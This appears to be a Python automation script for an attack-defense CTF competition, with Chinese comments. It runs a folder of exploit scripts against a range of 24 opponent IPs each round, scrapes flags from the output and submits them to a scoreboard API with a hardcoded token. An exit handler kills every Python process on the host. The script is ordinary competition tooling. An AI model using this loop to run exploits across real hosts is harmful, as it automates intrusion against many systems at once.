#!/usr/bin/python3
# coding=utf-8
# 可带参数执行(port,exp_file_dir)，如在命令行中运行python auto_submit.py 8888 work/pwn2/success_exps
# 使用前需要配置以下内容
##########################################################
self_id = 12        # 自己的队伍ip
# 目标ip的格式和范围
target_ip = ["10.100." +
            str(i)+".1" for i in range(1,25,1)]
port = "1337"       # 题目端口
# exp所在目录，注意每个exp文件最后一行在命令行中输出可直接用于提交的flag
# exp_file_dir = "/ctf/2021huaweictf/"
exp_file_dir = "/home/v1ct0r/桌面/desktop/ctf/2021huaweictf/pwn1/"
py_version = 3.7      # exp使用的python版本
timeout = 20        # 每个exp的超时时间，防止卡死
flag_pre = 'flag'    # flag前缀，如hwctf{d13bd1b1a}中的hwctf
# headers = {"Content-type": "application/x-www-form-urlencoded"}

# submit的格式包括页面url和访问token以及submit函数中curl链接格式，url需要加上http://
# submit_url = "http://172.22.109.99:19999/api/flag"
submit_url = "http://10.100.128.26/api/flag/submit"
# 使用requests进行提交flag时的http headers
headers = {"Accept": "application/json,text/plain,*/*", "Authorization": "tFFGJmYu",
                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}
submit_key = 'flag'  # 使用requests进行提交时http body里flag的key值
ret_key = 'msg'     # 提交后response返回的用于状态判断json的key值
ret_value = 'Flag Accepted!'   # 提交后response返回的用于状态判断json的value值
# 每个攻击轮次的间隔时间，单位秒
sleep_time = 60
##########################################################
# 使用前需要配置以上内容
# 运维人员可根据现场情况增加后续函数中的输出信息，如记录得分、flag提交状态等

import atexit
import signal
import subprocess
import os
import time
import threading
import sys
import requests
import re

@atexit.register
def exit_clean():
    global proc_exit
    proc_exit = True
    print("exit...")
    os.system("kill -9 $(pidof python)")
    os.system("kill -9 $(pidof python2)")


def getexpfiles(path, file_list):
    dir_list = os.listdir(path)
    for x in dir_list:
        new_x = os.path.join(path, x)
        if os.path.isdir(new_x):
            getexpfiles(new_x, file_list)
        elif os.path.isfile(new_x) and new_x.endswith('.py'):
            file_list.append(new_x)
    return file_list


def attack(ip):
    exp = ""
    try:
        exp_file = getexpfiles(exp_file_dir, [])
        for exp in exp_file:
            cmd = ['python'+str(py_version), exp, ip, port]
            start = time.time()
            f = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            while f.poll() is None:
                time.sleep(1)
                now = time.time()
                if (now - start) > timeout:
                    os.kill(f.pid, signal.SIGKILL)
                    os.waitpid(-1, os.WNOHANG)
                    print("[\033[0;37;41mERROR\033[0m] \033[0;32m"+ip+"\033[0m:\033[0;34m" +
                          port + ":\033[0m" + exp + " can not attack, because: \033[0;31m TIMEOUT \033[0m")
                    break
            res = f.stdout.readlines()
            # print(str(res))
            flag = re.findall(flag_pre+'{.*?}', str(res))
            if flag:
                print("[\033[0;32mSUCCE\033[0m] "+ip+":" +
                      port + " "+exp+" attack success!Get "+flag[0])
                return flag[0]
            else:
                print("[\033[0;37;41mERROR\033[0m] \033[0;32m"+ip+"\033[0m:\033[0;34m" +
                      port + ":\033[0m" + exp + " can not attack, because: \033[0;31m can not find flag! \033[0m")
        if not exp_file:
            print("[\033[0;37;41mERROR\033[0m] \033[0;32m"+ip+"\033[0m:\033[0;34m" +
                  port + ":\033[0m" + exp + " can not attack, because: \033[0;31m can not read any file in "+exp_file_dir+"\033[0m")
        else:
            print("[\033[0;37;41mERROR\033[0m] \033[0;32m"+ip+"\033[0m:\033[0;34m" +
                  port + ":\033[0m all exp\033[0;31m(" + str(exp_file) + ")\033[0m attack fail")
        return False

    except Exception as e:
        print("[\033[0;37;41mERROR\033[0m] \033[0;32m"+ip+"\033[0m:\033[0;34m" +
                  port + ":\033[0m" + exp + " can not attack, because: \033[0;31m" + str(e) + "\033[0m")
        return False


def submit(ip, flag):
    for i in range(3):
        try:
            # 运维人员根据比赛环境自己增加内容输出
            # a = os.popen("curl xxx" % flag)
            # print(a.readline())
            with requests.Session() as submit_session:
                submit_json = {submit_key: flag,"token":"tFFGJmYu"}
                r = submit_session.post(
                    submit_url, headers=headers, data=submit_json)
                if ret_value not in r.text:
                    time.sleep(2)
                    print("[\033[0;37;41mERROR\033[0m] \033[0;32m"+ip+"\033[0m:\033[0;34m" +
                          port + ":" + flag + "\033[0m submit failed, because: \033[0;31m" + r.text + "\nwill submit after sleep 3s\n"+"\033[0m")
                else:
                    print("[\033[0;32mSUCCE\033[0m] "+ip+":" +
                          port + ":" + flag + " submit success")
                    break
        except Exception as e:
            print("[\033[0;37;41mERROR\033[0m] \033[0;32m"+ip+"\033[0m:\033[0;34m" +
                  port + ":" + flag + "\033[0m submit failed, because: \033[0;31m" + str(e) + "\033[0m")


def thread_fun(ip):
    flag = attack(ip)
    if flag:
        submit(ip, flag)
        time.sleep(1)


def main2():
    try:
        thread_num = threading.active_count()
        for ip in target_ip:
            threading.Thread(target=thread_fun, args=(ip,)).start()
        while 1:
            if thread_num == threading.active_count():
                break
            else:
                print("doing attck...")
                time.sleep(8)
        print("[\033[0;30;43mROUND\033[0m] "+time.strftime("%Y-%m-%d %H:%M:%S",
              time.localtime())+" round attack end, waitting for next round")
    except Exception as e:
        print("[\033[0;37;41mERROR\033[0m] \033[0;37;41mmain function error, because: " + str(e) + "\033[0m")
        exit(0)

def main():
    for ip in target_ip:
        try:
            thread_fun(ip)           
        except Exception as e:
            print("[\033[0;37;41mERROR\033[0m] \033[0;37;41mmain function error, when attack "+ip+" because: " + str(e) + "\033[0m")          
    print("[\033[0;30;43mROUND\033[0m] "+time.strftime("%Y-%m-%d %H:%M:%S",
                  time.localtime())+" round attack end, waitting for next round")
                  
if __name__ == '__main__':
    try:
        while 1:
            # 每个轮次
            print("[\033[0;30;43mROUND\033[0m] " +
                  time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+" begin to attack")
            main()
            time.sleep(sleep_time)
    except Exception as e:
        print("[\033[0;37;41mERROR\033[0m] \033[0;37;41mmain function error, because: " + str(e) + "\033[0m")
        exit(0)